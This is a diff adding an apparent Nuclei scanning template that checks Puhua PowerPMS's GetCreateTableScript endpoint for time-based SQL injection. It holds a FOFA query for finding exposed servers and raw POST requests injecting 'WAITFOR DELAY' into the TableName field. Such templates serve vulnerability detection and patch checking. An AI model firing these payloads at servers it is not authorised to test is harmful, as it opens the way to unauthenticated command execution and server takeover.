@@ -1,0 +1,30 @@
+id: puhua-PowerPMS-GetCreateTableScript-sql-time
+
+info:
+  tags: puhua-PowerPMS-GetCreateTableScript-sql-time
+  name: 普华 PowerPMS GetCreateTableScript SQL延时注入
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+    普华 PowerPMS GetCreateTableScript 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+http:
+  - raw:
+      - |
+        POST /WebCenter/GetCreateTableScript HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        TableName=1';WAITFOR+DELAY+'0:0:4'--
+      - |
+        POST /WebCenter/GetCreateTableScript HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        TableName=1';WAITFOR+DELAY+'0:0:8'--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
